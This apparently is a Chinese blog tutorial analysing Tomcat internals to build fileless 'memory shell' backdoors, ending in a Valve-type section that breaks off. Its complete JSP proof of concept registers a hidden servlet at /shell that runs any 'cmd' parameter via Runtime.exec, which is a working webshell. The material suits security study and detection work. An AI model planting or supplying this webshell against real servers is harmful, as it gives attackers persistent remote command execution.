&#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.listenerFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Start manager</span></span><br><span class="line">                <span class="type">Manager</span> <span class="variable">manager</span> <span class="operator">=</span> getManager();</span><br><span class="line">                <span class="keyword">if</span> (manager <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">                    ((Lifecycle) manager).start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.managerFail&quot;</span>), e);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Configure and call application filters</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.filterFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Load and initialize all &quot;load on startup&quot; servlets</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!loadOnStartup(findChildren()))&#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.servletFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Start ContainerBackgroundProcessor thread</span></span><br><span class="line"> </span><br><span class="line">            <span class="built_in">super</span>.threadStart();</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件，我们跟进</p><p><img src="../images/image-20230801220307680.png" alt="image-20230801220307680"></p><p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p><p><img src="../images/image-20230801220508975.png" alt="image-20230801220508975"></p><p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化<code>StandWrapper</code>对象</p><p><img src="../images/image-20230801220610745.png" alt="image-20230801220610745"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        <span class="comment">// As far as possible, process in alphabetical order so it is easy to</span></span><br><span class="line">        <span class="comment">// check everything is present</span></span><br><span class="line">        <span class="comment">// Some validation depends on correct public ID</span></span><br><span class="line">        context.setPublicId(webxml.getPublicId());</span><br><span class="line"> </span><br><span class="line">...   <span class="comment">//设置StandardContext参数</span></span><br><span class="line"> </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//创建StandardWrapper对象</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//设置LoadOnStartup属性</span></span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletName属性</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletClass属性</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            ...</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">          </span><br><span class="line">            <span class="comment">//添加路径映射</span></span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p><h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p><p><img src="../images/image-20230801225654423.png" alt="image-20230801225654423"></p><p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">       TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">       <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">           <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">           <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line"></span><br><span class="line">           <span class="comment">//判断属性loadOnStartup的值</span></span><br><span class="line">           <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">           ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">           <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">               list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">               map.put(key, list);</span><br><span class="line">           &#125;</span><br><span class="line">           list.add(wrapper);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">       <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">           <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   wrapper.load();</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure><p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p><p>这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过<code>loadOnStartup</code>属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中。</p><p><img src="../images/image-20230801225907335.png" alt="image-20230801225907335"></p><h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上文的分析我们能够总结出创建Servlet的流程</p><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意Servlet</li><li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li></ol><p><img src="../images/image-20230801230244943.png" alt="image-20230801230244943"></p><p>这里的<code>StandardContext</code>可控  所以直接就使用该方法来直接构造</p><ol><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>属性值</li></ol><p><img src="../images/image-20230802101748580.png" alt="image-20230802101748580"></p><p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p><p><img src="../images/image-20230802102205318.png" alt="image-20230802102205318"></p><p>在创建这个对象的时候也会顺便创建这个值</p><ol><li>设置<code>StandardWrapper</code>对象的<code>ServletName</code>属性值</li></ol><p><strong>这是在创建<code>StandardWrapper</code>的时候可以看到的</strong></p><p><img src="../images/image-20230802102344977.png" alt="image-20230802102344977"></p><p>也是在创建这个<strong><code>StandardWrapper</code></strong>的时候会赋值的</p><ol><li>设置<code>StandardWrapper</code>对象的<code>ServletClass</code>属性值</li></ol><p><img src="../images/image-20230802102453965.png" alt="image-20230802102453965"></p><p>也是在创建这个<strong><code>StandardWrapper</code></strong>的时候会赋值的</p><ol><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li></ol><p><img src="../images/image-20230802102531093.png" alt="image-20230802102531093"></p><p>也是在创建这个<strong><code>StandardWrapper</code></strong>的时候会赋值的</p><ol><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><p><img src="../images/image-20230802102614271.png" alt="image-20230802102614271"></p><p>也是在创建这个<strong><code>StandardWrapper</code></strong>的时候会赋值的</p><p><strong>这里的步骤都是基于上面的分析   在这个创建<code>StandardWrapper</code>的方法中都可以看到是对上述参数的赋值</strong></p><h5 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h5><p>这里的获取<code>StandardContext</code>的方法多种多样  在上面的两种内存马类型都能看到了</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>或者</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="编写恶意Servlet"><a href="#编写恶意Servlet" class="headerlink" title="编写恶意Servlet"></a>编写恶意Servlet</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="创建Wrapper对象"><a href="#创建Wrapper对象" class="headerlink" title="创建Wrapper对象"></a>创建Wrapper对象</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="将Wrapper添加进StandardContext"><a href="#将Wrapper添加进StandardContext" class="headerlink" title="将Wrapper添加进StandardContext"></a>将Wrapper添加进StandardContext</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里的POC就和上面的分析步骤一模一样</p><p>先将原本的<code>Shell_Servlet.java</code>给注释掉   然后写入<code>Servlet.jsp</code>   然后进行访问</p><p><img src="../images/image-20230802105020798.png" alt="image-20230802105020798"></p><p>然后访问<code>/shell</code>路由  然后直接<code>cmd</code>执行命令</p><p><img src="../images/image-20230802105103102.png" alt="image-20230802105103102"></p><h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><p>在了解Valve之前，我们先来简单了解一下Tomcat中的<code>管道机制</code>。</p><p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p><p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制</p><p><img src="../images/20220218104446.png" alt="img"></p><p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p><p><strong>这里的话还是可以参考这篇文章</strong>    <a href="https://goodapple.top/archives/1359">关于tomcat是怎么运行处理的客户端传进的信息的</a></p><h4 id="管道机制流程分析"><a href="#管道机制流程分析" class="headerlink" title="管道机制流程分析"></a>管道机制流程分析</h4><p>我们先来看看Pipeline接口，继承了Contained接口</p><p><img src="../images/image-20230802113925704.png" alt="image-20230802113925704"></p><p>Pipeline接口提供了各种对Valve的操作方法，如我们可以通过<code>addValve()</code>方法来添加一个Valve。下面我们再来看看Valve接口</p><p><img src="../images/image-20230802114033701.png" alt="image-20230802114033701"></p><p>其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。</p><p><img src="../images/管道机制.jpg" alt="img"></p><p>同时Valve可以通过重写<code>invoke()</code>方法来实现具体的业务逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中</p><p><img src="../images/image-20230802120640820.png" alt="image-20230802120640820"></p><p>前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下<code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p><p>首先通过<code>connector.getService()</code>来获取一个StandardService对象</p><p><img src="../images/图片-47.png" alt="img"></p><p>接着通过<code>StandardService</code>.<code>getContainer().getPipeline()</code>获取<code>StandardPipeline</code>对象。</p><p>再通过<code>StandardPipeline.getFirst()</code>获取第一个Valve</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 